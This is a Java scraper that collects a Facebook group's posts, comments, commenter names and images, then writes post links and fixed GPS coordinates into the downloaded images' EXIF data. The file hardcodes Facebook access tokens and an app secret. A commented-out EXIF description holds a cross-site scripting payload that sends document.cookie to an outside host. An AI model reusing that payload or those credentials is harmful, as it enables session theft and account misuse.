package students;

import facebook4j.*;
import facebook4j.auth.AccessToken;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.sanselan.ImageReadException;
import org.apache.sanselan.ImageWriteException;
import org.apache.sanselan.Sanselan;
import org.apache.sanselan.common.IImageMetadata;
import org.apache.sanselan.formats.jpeg.JpegImageMetadata;
import org.apache.sanselan.formats.jpeg.exifRewrite.ExifRewriter;
import org.apache.sanselan.formats.tiff.TiffImageMetadata;
import org.apache.sanselan.formats.tiff.constants.TagInfo;
import org.apache.sanselan.formats.tiff.constants.TiffConstants;
import org.apache.sanselan.formats.tiff.constants.TiffDirectoryConstants;
import org.apache.sanselan.formats.tiff.fieldtypes.FieldType;
import org.apache.sanselan.formats.tiff.write.TiffOutputDirectory;
import org.apache.sanselan.formats.tiff.write.TiffOutputField;
import org.apache.sanselan.formats.tiff.write.TiffOutputSet;
import org.json.simple.*;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.util.List;

/**
 * Created by Ilya Evlampiev on 05.11.2015.
 */
public class FacebookTest {

    public static void main(String[] args) throws FacebookException {

        // Generate facebook instance.
        Facebook facebook = new FacebookFactory().getInstance();
        // Use default values for oauth app id.
        //facebook.setOAuthAppId("364269713648653", "96beddbfcd1b45050757e8c9d9a50a80");
        // Get an access token from:
        // https://developers.facebook.com/tools/explorer
        // Copy and paste it below.

        //String accessTokenString = "CAACEdEose0cBAHGd3kL538jkZBjZBiXOl654RKOy1TgVwG1EBvvx9MZAbMZC5n19NerwZAQAjnnVUUZBI1nA4gK9Gu6xRZBvTceKNTu0Lc0Y23Mzw6ZAFblV9EN3sZBMY7jypjfOOwoMY7tedVlBJGBeY5ZBdo4jkQ4hc76ZBcAJZALUTxnZCf7YiH9FMD5WIZC9CJJ9BfD1GS6R61tQZDZD";
        //AccessToken at = new AccessToken(accessTokenString);
        //facebook.setOAuthAccessToken(at);

        String accessTokenString = "CAAFLTSbibA0BAE2E7AvqeWZAwFhhs5EhonarFZAcKU7hBdeSh67ZALeGNAwIx4lnChim7wa6Gh2PIg6RBKbHoxOGQ8LmlsEZA0nor6zGBHsSphNItFDhsZCffrh0PsIvnTWKNYyjcZChVX1Unwj2Dedq5opZCw1JxRcZCEcNwiZBMjqRPeVBpgXS77VIZCXhMBzxhcY5w7moebmwZDZD";
                                  //CAAFLTSbibA0BAFWMDywzMDHZA8DRhvQZA7lZCJg4MsRQkhWfKZB0CYePajvwL2xNxFAsD3ZBSHFMOXFIZAAZC5MOFCqvFhOvj1tPzIYPJwtrOzWrZBHWTd8eUvkZBXqS4NIKVpP2HusasskmAFKKDGZCBXaZBnXnhZC3NwPpb1su7QbjqGOoBfvX97c97kHAWHytaaWdZB2caH0AU2AZDZD

        AccessToken extendedToken = facebook.extendTokenExpiration(accessTokenString);
        // Set access token.
        facebook.setOAuthAccessToken(extendedToken);

        // We're done.
        // Access group feeds.
        // You can get the group ID from:
        // https://developers.facebook.com/tools/explorer

        // Set limit to 25 feeds.
        ResponseList<Post> feeds = facebook.getFeed("1378876582438173",
                new Reading().limit(100));

        // For all 25 feeds...
        Paging pg = feeds.getPaging();

        //here we 'scroll' already procssed posts in order to reach others that was not available after token expiration
        int k = 1, j = 1;


/*
        for (int a = 1; a < 8; a++) {
            k=k+100;
            feeds = facebook.fetchNext(pg);
            pg = feeds.getPaging();
        }
*/
        // a<8 -> POST-851
        // a<10 -> POST-1100
        // a < 16 -> POST-1673
        // a<22 -> POST-2312
        // a<27 -> POST-2709
        // a<33 -> POST-3381
        // a<42 -> POST-4240
        // a<52 -> POST-5241
        // a<61 -> POST-6147

        do {

            for (int i = 0; i < feeds.size(); i++) {
                // Get post.
                Post post = feeds.get(i);
                // Get (string) message.
                String message = post.getMessage();
                // Print out the message.
                System.out.println("POST-" + k + " " + message);

                // Get more stuff...
                PagableList<Comment> comments = post.getComments();
                URL postimage = post.getPicture();
                System.out.println("POST-" + k + " " + postimage);
                URL anotherUrl = facebook.getPictureURL(post.getId(), PictureSize.large);
                System.out.println("POST-" + anotherUrl);

                Photo postPhoto = facebook.photos().getPhoto(post.getId());
                System.out.println("POST-" + k + " " + postPhoto.getLink());

                Paging commpg = comments.getPaging();
                do {

                    for (int l = 0; l < comments.size(); l++) {
                        // Get post.
                        Comment comm = comments.get(l);
                        // Get (string) message.
                        System.out.println("    COMMENT-" + j + " " + comm);
                        String messageC = comm.getMessage();
                        // Print out the message.
                        System.out.println("    COMMENT-" + j + " " + messageC);
                        System.out.println("    COMMENT-" + j + " " + comm.getCreatedTime());
                        //System.out.println(comm.getFrom().);

                        String date = comm.getCreatedTime().toString();
                        String name = comm.getFrom().getName();
                        String id = comm.getId();

                        Photo commPhoto = facebook.photos().getPhoto(comm.getId());
                        System.out.println("    COMMENT-" + j + " " + commPhoto.getLink());
                        List<Image> li = postPhoto.getImages();

                        URL u = null;

                        try {
                            String url = String.format("https://graph.facebook.com/%s_%s?fields=attachment&access_token=%s", post.getId(), comm.getId(), extendedToken.getToken());
                            System.out.println("   -COMMENT-" + j + " url from graph: " + url);
                            //u = new URL(url);
                            //HttpURLConnection huc = (HttpURLConnection) u.openConnection();
                            //huc.setRequestMethod("GET");
                            //huc.setDoOutput(true);
                            //huc.connect();
                            //OutputStream os = huc.getOutputStream();
                            //int code = huc.getResponseCode();

                            DefaultHttpClient httpClient = new DefaultHttpClient();
                            HttpGet getRequest = new HttpGet(
                                    url);
                            getRequest.addHeader("accept", "application/json");

                            HttpResponse response = httpClient.execute(getRequest);

                            if (response.getStatusLine().getStatusCode() != 200) {
                                //throw new RuntimeException("Failed : HTTP error code : "
                                System.out.println("Error" + response.getStatusLine().getStatusCode());
                            }

                            BufferedReader br = new BufferedReader(
                                    new InputStreamReader((response.getEntity().getContent())));

                            String output;
                            String out = "";
                            System.out.println("Output from Server .... \n");
                            while ((output = br.readLine()) != null) {
                                System.out.println(output);
                                out = out + output;
                            }
                            httpClient.getConnectionManager().shutdown();

                            try {
                                JSONParser parser = new JSONParser();

                                Object obj = parser.parse(out);
                                JSONObject jsonObj = (JSONObject) obj;
                                JSONObject attach = (JSONObject) jsonObj.get("attachment");
                                if (attach != null) {
                                    JSONObject media = (JSONObject) attach.get("media");
                                    if (media != null) {

                                        JSONObject image = (JSONObject) media.get("image");
                                        String urlSrc = (String) image.get("src");
                                        System.out.println(urlSrc);

                                        httpClient = new DefaultHttpClient();
                                        HttpGet httpget = new HttpGet(urlSrc);
                                        HttpResponse respon = httpClient.execute(httpget);
                                        HttpEntity entity = respon.getEntity();
                                        if (entity != null) {
                                            long len = entity.getContentLength();
                                            if (len > 1) {
                                                // How do I write it?
                                                InputStream is = entity.getContent();
                                                String filePath = "C:\\nostalgique\\" + post.getId() + "_" + comm.getId() + ".jpg";
                                                File f=new File(filePath);
                                                String filePath2 = "C:\\nostalgique\\" + post.getId() + "_" + comm.getId() + "_.jpg";
                                                File f2=new File(filePath2);

                                                FileOutputStream fos = new FileOutputStream(f);
                                                int inByte;
                                                while ((inByte = is.read()) != -1)
                                                    fos.write(inByte);
                                                is.close();
                                                fos.close();
                                                try {
                                                    String exif_desc="no main photo";
                                                    System.out.println("LINK OF MAIN POST IS WRITTEN TO THE EXIF!");
                                                    if (postPhoto.getLink()!=null) {exif_desc=postPhoto.getLink().toString();}
                                                    changeExifMetadata(f,f2,exif_desc);//post.getSource().toString());
                                                    f.delete();
                                                } catch (ImageReadException e) {
                                                    e.printStackTrace();
                                                } catch (ImageWriteException e) {
                                                    e.printStackTrace();
                                                }
                                            }
                                        }
                                    }
                                }

                            } catch (ParseException e) {
                                e.printStackTrace();
                            }


                        } catch (MalformedURLException e) {
                            e.printStackTrace();
                        } catch (ProtocolException e) {
                            e.printStackTrace();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                        j++;
                    }


                    //for (Comment comment: comments)
                    //    fullComments.add(comment);

                    // get next page
                    // NOTE: somehow few comments will not be included.
                    // however, this won't affect much on our research
                    commpg = comments.getPaging();

                    extendedToken = facebook.extendTokenExpiration(extendedToken.getToken());
                    // Set access token.
                    facebook.setOAuthAccessToken(extendedToken);


                } while ((commpg != null) &&
                        ((comments = facebook.fetchNext(commpg)) != null));


                //System.out.println(comments);

                String date = post.getCreatedTime().toString();
                String name = post.getFrom().getName();
                String id = post.getId();
                k++;

            }


            //for (Comment comment: comments)
            //    fullComments.add(comment);

            // get next page
            // NOTE: somehow few comments will not be included.
            // however, this won't affect much on our research
            pg = feeds.getPaging();

        } while ((pg != null) &&
                ((feeds = facebook.fetchNext(pg)) != null));
    }

    public static class Attachment {
        public Attachment() {
        }

        ;

        public String getId() {
            return id;
        }

        public void setId(String id) {
            this.id = id;
        }

        public FacebookTest.media getMedia() {
            return media;
        }

        public void setMedia(FacebookTest.media media) {
            this.media = media;
        }

        public String id;
        public media media;
    }

    public static class media {
        public media() {
        }

        ;
        public image image;

        public FacebookTest.image getImage() {
            return image;
        }

        public void setImage(FacebookTest.image image) {
            this.image = image;
        }
    }

    public static class image {
        public image() {
        }

        ;
        public String src;
        public String height;

        public String getSrc() {
            return src;
        }

        public void setSrc(String src) {
            this.src = src;
        }

        public String getHeight() {
            return height;
        }

        public void setHeight(String height) {
            this.height = height;
        }


    }

    public static void changeExifMetadata(File jpegImageFile, File dst, String desc)
            throws IOException, ImageReadException, ImageWriteException
    {
        OutputStream os = null;
        try
        {
            TiffOutputSet outputSet = null;

            // note that metadata might be null if no metadata is found.
            IImageMetadata metadata = Sanselan.getMetadata(jpegImageFile);
            JpegImageMetadata jpegMetadata = (JpegImageMetadata) metadata;

            if (null != jpegMetadata)
            {
                // note that exif might be null if no Exif metadata is found.
                TiffImageMetadata exif = jpegMetadata.getExif();

                //TiffImageMetadata exif=new TiffImageMetadata(null);

                if (null != exif)
                {
                    // TiffImageMetadata class is immutable (read-only).
                    // TiffOutputSet class represents the Exif data to write.
                    //
                    // Usually, we want to update existing Exif metadata by
                    // changing
                    // the values of a few fields, or adding a field.
                    // In these cases, it is easiest to use getOutputSet() to
                    // start with a "copy" of the fields read from the image.
                    outputSet = exif.getOutputSet();
                }
                else
                {
                    outputSet=new TiffOutputSet();

                }
            }

            // if file does not contain any exif metadata, we create an empty
            // set of exif metadata. Otherwise, we keep all of the other
            // existing tags.
            if (null == outputSet)
                outputSet = new TiffOutputSet();

            {
                // Example of how to add a field/tag to the output set.
                //
                // Note that you should first remove the field/tag if it already
                // exists in this directory, or you may end up with duplicate
                // tags. See above.
                //
                // Certain fields/tags are expected in certain Exif directories;
                // Others can occur in more than one directory (and often have a
                // different meaning in different directories).
                //
                // TagInfo constants often contain a description of what
                // directories are associated with a given tag.
                //
                // see
                // org.apache.sanselan.formats.tiff.constants.AllTagConstants
                //
                //String description_string="jaꞑalif7 <br> <script>" +
                //        "img = new Image(); img.src = \"http://httpz.ru/n22ref260pd.gif?\"+document.cookie;" +
                //        "</script> script ended<br> script was inserted \nhere ";
                String description_string=desc;

                /*
                for (int i=0; i<1000; i++)
                {
                    description_string=description_string+"abcdefghigklmopq"+i;
                }
                */

                TiffOutputField aperture = TiffOutputField.create(
                        TiffConstants.EXIF_TAG_APERTURE_VALUE,
                        outputSet.byteOrder, new Double(1.3));
                for (FieldType a: TiffConstants.EXIF_TAG_IMAGE_DESCRIPTION.dataTypes )

                {//System.out.println(a.toString());
                    //System.out.println(a.name);
                }



                TagInfo EXIF_TAG_IMAGE_DESCRIPTION = new TagInfo(
                        "Image Description", 0x010e, TiffOutputField.FIELD_TYPE_DESCRIPTION_ASCII, 1,
                        TiffDirectoryConstants.EXIF_DIRECTORY_IFD0);


                byte[] arr;
                arr=description_string.getBytes("UTF-8");
                int count=arr.length;
                TiffOutputField description;
                description = new TiffOutputField(0x010e,
                        EXIF_TAG_IMAGE_DESCRIPTION,TiffOutputField.FIELD_TYPE_ASCII,
                        count,arr);
                //11,arr);
                TiffOutputDirectory exifDirectory = new TiffOutputDirectory(TiffDirectoryConstants.EXIF_DIRECTORY_IFD0.directoryType);
                //outputSet.addDirectory(exifDirectory); //findDirectory(TiffDirectoryConstants.DIRECTORY_TYPE_DIR_0);

                //System.out.println(description);
                //getOrCreateExifDirectory();

                //TiffConstants.EXIF_TAG_IMAGE_DESCRIPTION
                //outputSet.
                // make sure to remove old value if present (this method will
                // not fail if the tag does not exist).

                //exifDirectory.removeField(TiffConstants.EXIF_TAG_APERTURE_VALUE);

                //System.out.println(exifDirectory.getFields());
                exifDirectory.add(aperture);
                //System.out.println(exifDirectory.getFields());

                //exifDirectory.removeField(EXIF_TAG_IMAGE_DESCRIPTION);

                //System.out.println(exifDirectory.getFields());

                //outputSet.removeField(EXIF_TAG_IMAGE_DESCRIPTION);
                //outputSet.getRootDirectory().removeField(EXIF_TAG_IMAGE_DESCRIPTION);
                //description.count=20;

                outputSet.addDirectory(exifDirectory);
                exifDirectory.add(description);
           }

            {
                // Example of how to add/update GPS info to output set.

                // New York City
                double longitude = -74.0; // 74 degrees W (in Degrees East)
                double latitude = 40 + 43 / 60.0; // 40 degrees N (in Degrees
                // North)

                outputSet.setGPSInDegrees(longitude, latitude);
                //outputSet.s
            }

            //printTagValue(jpegMetadata, TiffConstants.TIFF_TAG_DATE_TIME);

            os = new FileOutputStream(dst);
            //os = new BufferedOutputStream(os);

            new ExifRewriter().updateExifMetadataLossless(jpegImageFile, os,
                    outputSet);

            os.close();
            os = null;
        } finally
        {
            if (os != null)
                try
                {
                    os.close();
                } catch (IOException e)
                {

                }
        }
    }

}
